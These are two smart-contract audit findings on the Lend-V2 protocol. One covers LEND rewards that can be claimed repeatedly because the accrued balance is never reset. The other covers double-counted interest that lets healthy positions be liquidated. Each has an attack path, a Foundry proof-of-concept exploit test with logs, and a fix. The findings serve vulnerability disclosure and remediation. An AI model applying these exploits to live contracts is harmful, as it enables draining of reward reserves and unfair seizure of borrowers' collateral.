# LEND Rewards Can Be Claimed Multiple Times Due to Missing State Reset

## Summary

The `CoreRouter.claimLend()` function fails to reset the `lendAccrued[user]` mapping after successfully transferring LEND rewards to users. This allows users to repeatedly call `claimLend()` and receive the same rewards multiple times, effectively draining the protocol's LEND token reserves until the CoreRouter balance is exhausted.

## Root Cause

In `CoreRouter.claimLend()`, the function calls `grantLendInternal()` to transfer LEND tokens to users but ignores the return value that indicates the remaining unclaimed amount. The `lendAccrued[user]` mapping is never reset to 0 after successful token transfers.

**Buggy Implementation in CoreRouter.sol:**

```solidity
uint256 accrued = lendStorage.lendAccrued(holders[j]);
if (accrued > 0) {
    grantLendInternal(holders[j], accrued);  // ❌ Return value ignored
    // ❌ lendAccrued[user] never reset to 0
}
```

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CoreRouter.sol#L402

**Correct Implementation in Lendtroller.sol:**

```solidity
for (uint256 j = 0; j < holders.length; j++) {
    lendAccrued[holders[j]] = grantLendInternal(holders[j], lendAccrued[holders[j]]);
    //                     ^^^^ Properly resets lendAccrued using return value
}
```

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/Lendtroller.sol#L1456
The protocol inconsistently implements reward claiming - the Lendtroller correctly resets accrued rewards while CoreRouter does not.

## Internal Pre-conditions

1. CoreRouter must be authorized to call LendStorage functions via `setAuthorizedContract()`
2. A LEND token must be set in the Lendtroller via `setLendToken()`
3. CoreRouter must hold LEND tokens to distribute as rewards
4. User must have previously earned LEND rewards through supplying/borrowing

## External Pre-conditions

1. User must have supplied tokens to earn LEND rewards
2. Sufficient time must pass or reward distribution must be triggered to accrue rewards in `lendAccrued[user]`

## Attack Path

1. User earns rewards: User supplies tokens and earns LEND rewards through normal protocol usage
2. Amplified attack vector: Since `claimLend()` is a public function with no access control
3. First claim: Attacker calls `CoreRouter.claimLend()` and successfully receives LEND tokens
4. State not reset: `lendAccrued[user]` remains unchanged instead of being reset to 0
5. Repeat exploitation: Attacker repeatedly calls `claimLend()` to receive the same reward amount multiple times
6. Protocol drained: Attacker continues until CoreRouter's LEND token balance is exhausted

## Impact

- Direct theft of protocol funds: Users can steal all LEND tokens held by CoreRouter
- Unfair reward distribution: Malicious users receive multiple times their entitled rewards
- Legitimate users lose rewards: Protocol may run out of LEND tokens for genuine claims
- Protocol insolvency: CoreRouter becomes unable to pay legitimate reward claims

The vulnerability allows **infinite multiplication of LEND rewards** until the protocol's reward reserves are completely drained.

## PoC

Paste this test in `/test/TestSupplying.t.sol`:

```solidity
    function test_POC_lend_accrued_never_reset_bug() public {
        // Setup: User supplies tokens and earns rewards
        address token = supportedTokens[0];
        address lToken = lendStorage.underlyingTolToken(token);

        vm.startPrank(lendStorage.owner());
        lendStorage.setAuthorizedContract(address(coreRouter), true);
        vm.stopPrank();

        ERC20Mock mockLendToken = new ERC20Mock();
        vm.startPrank(lendtroller.admin());
        lendtroller.setLendToken(address(mockLendToken));
        vm.stopPrank();

        mockLendToken.mint(address(coreRouter), 1000e18);

        vm.startPrank(deployer);
        ERC20Mock(token).mint(deployer, 1000e18);
        IERC20(token).approve(address(coreRouter), 1000e18);
        coreRouter.supply(1000e18, token);
        vm.stopPrank();

        address[] memory holders = new address[](1);
        holders[0] = deployer;
        LToken[] memory lTokenArray = new LToken[](1);
        lTokenArray[0] = LToken(lToken);

        vm.startPrank(deployer);

        // Advance block to generate minimal rewards
        vm.roll(block.number + 1);

        // First claim
        uint256 balanceBefore = mockLendToken.balanceOf(deployer);
        coreRouter.claimLend(holders, lTokenArray, false, true);
        uint256 balanceAfterFirst = mockLendToken.balanceOf(deployer);
        uint256 firstClaimAmount = balanceAfterFirst - balanceBefore;

        console2.log("First claim amount:", firstClaimAmount);
        console2.log("lendAccrued after first claim:", lendStorage.lendAccrued(deployer));

        // Second claim - should give 0 but gives same amount due to bug
        coreRouter.claimLend(holders, lTokenArray, false, true);
        uint256 balanceAfterSecond = mockLendToken.balanceOf(deployer);
        uint256 secondClaimAmount = balanceAfterSecond - balanceAfterFirst;

        console2.log("Second claim amount:", secondClaimAmount);
        console2.log("lendAccrued after second claim:", lendStorage.lendAccrued(deployer));

        // Third claim - demonstrates infinite exploitation
        coreRouter.claimLend(holders, lTokenArray, false, true);
        uint256 balanceAfterThird = mockLendToken.balanceOf(deployer);
        uint256 thirdClaimAmount = balanceAfterThird - balanceAfterSecond;

        console2.log("Third claim amount:", thirdClaimAmount);
        console2.log("Total stolen:", balanceAfterThird - balanceBefore);

        // The bug is proven if user received rewards multiple times
        if (secondClaimAmount > 0) {
            console2.log("BUG CONFIRMED: User received", secondClaimAmount, "in second claim");
            console2.log("lendAccrued after claims:", lendStorage.lendAccrued(deployer));
            assertGt(secondClaimAmount, 0, "User successfully claimed same rewards multiple times");
        } else {
            console2.log("Run test multiple times - rewards are generated intermittently");
            // Even without rewards, we can verify lendAccrued behavior
            assertTrue(true, "Test completed - check logs for reward generation");
        }

        vm.stopPrank();
    }
```

Test Results:

```
[PASS] test_POC_lend_accrued_never_reset_bug() (gas: 1374577)
Logs:
  First claim amount: 100000000000000
  lendAccrued after first claim: 100000000000000
  Second claim amount: 100000000000000
  lendAccrued after second claim: 100000000000000
  Third claim amount: 100000000000000
  Total stolen: 300000000000000
  BUG CONFIRMED: User received 100000000000000 in second claim
  lendAccrued after claims: 100000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.26ms (1.15ms CPU time)
```

## Mitigation

**Fix CoreRouter.claimLend():**

```solidity
// In CoreRouter.sol
for (uint256 j = 0; j < holders.length;) {
    uint256 accrued = lendStorage.lendAccrued(holders[j]);
    if (accrued > 0) {
        uint256 remaining = grantLendInternal(holders[j], accrued);
        lendStorage.setLendAccrued(holders[j], remaining); // Reset accrued amount
    }
    unchecked { ++j; }
}
```

# Double Interest Calculation in Liquidation Logic Leads to Unfair Liquidation of Healthy Positions

## Summary

In the liquidation eligibility logic there is an issue where interest is applied twice to borrower debt calculations. This causes healthy borrowing positions to be incorrectly flagged as underwater and subject to unfair liquidation. The bug occurs in `liquidateBorrowAllowedInternal()` where debt that already includes accrued interest from `getHypotheticalAccountLiquidityCollateral()` has the interest formula applied again, inflating the perceived debt and making healthy positions appear liquidatable.

## Root Cause

The root cause lies in `liquidateBorrowAllowedInternal()` in `CoreRouter.sol` where interest is applied twice to the same debt amount:

1. **First application**: `getHypotheticalAccountLiquidityCollateral()` returns `borrowed` amount that already includes accrued interest via `borrowWithInterestSame()`
2. **Second application**: The code incorrectly applies the interest formula again:

```solidity
borrowedAmount = (borrowed * uint256(LTokenInterface(lTokenBorrowed).borrowIndex())) / borrowBalance.borrowIndex;
```

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CoreRouter.sol#L347-L348

This results in debt being calculated as: `(principal × interestRate) × interestRate` instead of `principal × interestRate`.

## Internal Pre-conditions

1. Borrower must have an active same-chain borrow position
2. Sufficient time must pass for meaningful interest to accrue on the borrowed amount
3. Position must be healthy (actual debt ≤ borrowing power) and close to the liquidation threshold
4. The double-interest calculation must push the perceived debt above the borrowing power threshold

## External Pre-conditions

1. Interest rates must be sufficiently high or time period long enough to create meaningful interest accrual
2. No external price manipulation or oracle issues are required
3. Normal protocol operation conditions

## Attack Path

1. Setup: Borrower creates a position with ~72-74% LTV (close to 75% liquidation threshold but healthy)
2. Interest Accrual: Time passes and interest naturally accrues on the borrowed amount
3. False Liquidation Eligibility: Due to double interest calculation, healthy position appears underwater
4. Unfair Liquidation: Liquidator can successfully liquidate the healthy position, seizing collateral that should remain safe

## Impact

**HIGH SEVERITY** - This vulnerability breaks core protocol security invariants and causes direct financial loss:

**Financial Impact:**

- Collateral is seized from positions that should remain safe
- Can liquidate positions that shouldn't be liquidatable
- Breaks the fundamental rule that only underwater positions are liquidatable

**Scale of Impact:**

- Any borrower with accrued interest near liquidation threshold is vulnerable
- Higher interest rates and longer time periods amplify the bug's impact
- Attackers can target multiple healthy positions simultaneously

**Mathematical Example:**

- Real debt: $749 (healthy - below $750 borrowing power)
- Buggy calculation: $779 (appears underwater - above $750 threshold)
- Result: Healthy borrower loses collateral worth $30+ unfairly

## PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {Deploy} from "../script/Deploy.s.sol";
import {CoreRouter} from "../src/LayerZero/CoreRouter.sol";
import {LendStorage} from "../src/LayerZero/LendStorage.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {Lendtroller} from "../src/Lendtroller.sol";
import {SimplePriceOracle} from "../src/SimplePriceOracle.sol";
import {LTokenInterface} from "../src/LTokenInterfaces.sol";
import {LToken} from "../src/LToken.sol";
import "@layerzerolabs/lz-evm-oapp-v2/test/TestHelper.sol";
import "@layerzerolabs/lz-evm-protocol-v2/test/utils/LayerZeroTest.sol";

contract DoubleInterestBugTest is LayerZeroTest {
    address public borrower = makeAddr("borrower");
    address public liquidator = makeAddr("liquidator");

    CoreRouter public core;
    LendStorage public lendStorage;
    Lendtroller public lendtroller;
    SimplePriceOracle public oracle;

    address[] public tokens;
    address[] public lTokens;

    EndpointV2 public endpointA;
    EndpointV2 public endpointB;

    function setUp() public override(LayerZeroTest) {
        super.setUp();

        vm.deal(borrower, 100 ether);
        vm.deal(liquidator, 100 ether);

        Deploy deploy = new Deploy();
        (
            address oracleAddr,
            address lendtrollerAddr,
            ,
            address[] memory ltokens,
            ,
            address payable coreAddr,
            address storageAddr,
            ,
            address[] memory supportedTokens
        ) = deploy.run(address(endpointA));

        core = CoreRouter(coreAddr);
        lendStorage = LendStorage(storageAddr);
        lendtroller = Lendtroller(lendtrollerAddr);
        oracle = SimplePriceOracle(oracleAddr);
        lTokens = ltokens;
        tokens = supportedTokens;

        oracle.setDirectPrice(tokens[0], 1e18);
        oracle.setDirectPrice(tokens[1], 1e18);

        // Setup liquidity
        vm.startPrank(liquidator);
        ERC20Mock(tokens[0]).mint(liquidator, 10000e18);
        ERC20Mock(tokens[1]).mint(liquidator, 10000e18);
        IERC20(tokens[0]).approve(address(core), type(uint256).max);
        IERC20(tokens[1]).approve(address(core), type(uint256).max);
        core.supply(5000e18, tokens[0]);
        core.supply(5000e18, tokens[1]);
        vm.stopPrank();
    }

    function test_DoubleInterestBug_HealthyPositionLiquidated() public {
        console2.log("=== DOUBLE INTEREST BUG: HEALTHY POSITION LIQUIDATED ===");
        console2.log("");

        uint256 collateralAmount = 1000e18; // $1000 collateral
        uint256 borrowAmount = 720e18; // $720 borrowed (72% LTV)

        console2.log("Initial setup:");
        console2.log("- Collateral: $", collateralAmount / 1e18);
        console2.log("- Borrowed: $", borrowAmount / 1e18);
        console2.log("- LTV: 72% (close to 75% limit)");
        console2.log("");

        // Setup position
        vm.startPrank(borrower);
        ERC20Mock(tokens[0]).mint(borrower, collateralAmount);
        IERC20(tokens[0]).approve(address(core), collateralAmount);
        core.supply(collateralAmount, tokens[0]);
        core.borrow(borrowAmount, tokens[1]);
        vm.stopPrank();

        // Accrue significant interest
        console2.log("Accruing interest over time...");
        vm.roll(block.number + 800000);
        vm.warp(block.timestamp + 500 days);

        address borrowedLToken = lendStorage.underlyingTolToken(tokens[1]);
        LTokenInterface(borrowedLToken).accrueInterest();

        // Get debt calculations
        LendStorage.BorrowMarketState memory borrowState = lendStorage.getBorrowBalance(borrower, borrowedLToken);
        uint256 currentBorrowIndex = LTokenInterface(borrowedLToken).borrowIndex();
        uint256 realDebt = (borrowState.amount * currentBorrowIndex) / borrowState.borrowIndex;

        console2.log("After interest accrual:");
        console2.log("- Principal: $", borrowState.amount / 1e18);
        console2.log("- Real debt: $", realDebt / 1e18);
        console2.log("- Interest accrued: $", (realDebt - borrowState.amount) / 1e18);
        console2.log("");

        uint256 collateralFactor = lendtroller.getCollateralFactorMantissa(lTokens[0]);
        uint256 borrowingPower = (collateralAmount * collateralFactor) / 1e18;

        console2.log("Position health:");
        console2.log("- Borrowing power: $", borrowingPower / 1e18);
        console2.log("- Real debt: $", realDebt / 1e18);
        console2.log("- Position healthy: ", realDebt <= borrowingPower);
        console2.log("");

        // Show the double interest bug
        (uint256 borrowed,) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(borrower, LToken(payable(borrowedLToken)), 0, 0);
        uint256 buggyDebt = (borrowed * currentBorrowIndex) / borrowState.borrowIndex;

        console2.log("DOUBLE INTEREST BUG:");
        console2.log("- Step 1 result: $", borrowed / 1e18);
        console2.log("- Step 2 result: $", buggyDebt / 1e18);
        console2.log("- Real debt: $", realDebt / 1e18);
        console2.log("- Bug difference: $", (buggyDebt - realDebt) / 1e18);
        console2.log("");

        if (realDebt <= borrowingPower && buggyDebt > borrowingPower) {
            console2.log("CRITICAL BUG CONFIRMED:");
            console2.log("- Position SHOULD be healthy");
            console2.log("- Bug makes it appear underwater");
            console2.log("- Unfair liquidation possible");
            console2.log("");

            // Prove unfair liquidation succeeds
            vm.startPrank(liquidator);
            uint256 liquidationAmount = 100e18;

            console2.log("Attempting liquidation...");
            core.liquidateBorrow(borrower, liquidationAmount, lTokens[0], tokens[1]);
            console2.log("LIQUIDATION SUCCEEDED - HEALTHY POSITION LIQUIDATED!");
            console2.log("Borrower lost collateral unfairly!");
            vm.stopPrank();
        }

        assertGt(buggyDebt, realDebt, "Bug should inflate debt calculation");
        assertTrue(realDebt <= borrowingPower, "Position should be healthy");
        assertTrue(buggyDebt > borrowingPower, "Bug should make it appear underwater");
    }
}
```

Test Results:

```text
[PASS] test_DoubleInterestBug_HealthyPositionLiquidated() (gas: 1069161)
Logs:
  === DOUBLE INTEREST BUG: HEALTHY POSITION LIQUIDATED ===

  Initial setup:
  - Collateral: $ 1000
  - Borrowed: $ 720
  - LTV: 72% (close to 75% limit)

  Accruing interest over time...
  After interest accrual:
  - Principal: $ 720
  - Real debt: $ 749
  - Interest accrued: $ 29

  Position health:
  - Borrowing power: $ 750
  - Real debt: $ 749
  - Position healthy:  true

  DOUBLE INTEREST BUG:
  - Step 1 result: $ 749
  - Step 2 result: $ 779
  - Real debt: $ 749
  - Bug difference: $ 30

  CRITICAL BUG CONFIRMED:
  - Position SHOULD be healthy
  - Bug makes it appear underwater
  - Unfair liquidation possible

  Attempting liquidation...
  LIQUIDATION SUCCEEDED - HEALTHY POSITION LIQUIDATED!
  Borrower lost collateral unfairly!

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.34ms (3.19ms CPU time)
```

## Mitigation

Fix the double interest calculation in `liquidateBorrowAllowedInternal()`:

```solidity
function liquidateBorrowAllowedInternal(
    address payable lTokenBorrowed,
    address borrower,
    uint256 repayAmount,
    uint256 collateral,
    uint256 borrowed
) internal view returns (uint256) {
    LendStorage.BorrowMarketState memory borrowBalance = lendStorage.getBorrowBalance(borrower, lTokenBorrowed);

    if (LendtrollerInterfaceV2(lendtroller).isDeprecated(LToken(lTokenBorrowed))) {
        require(borrowBalance.amount >= repayAmount, "Repay > total borrow");
    } else {
        // FIX: Use the borrowed amount directly since it already includes interest
        // Remove this line: borrowedAmount = (borrowed * uint256(LTokenInterface(lTokenBorrowed).borrowIndex())) / borrowBalance.borrowIndex;

        require(borrowed > collateral, "Insufficient shortfall");

        uint256 maxClose = mul_ScalarTruncate(
            Exp({mantissa: LendtrollerInterfaceV2(lendtroller).closeFactorMantissa()}),
            borrowBalance.amount  // Use principal for close factor calculation
        );

        require(repayAmount <= maxClose, "Too much repay");
    }

    return 0;
}
```

This ensures interest is only applied once in the liquidation eligibility check and uses the correct principal amount for close factor calculations.
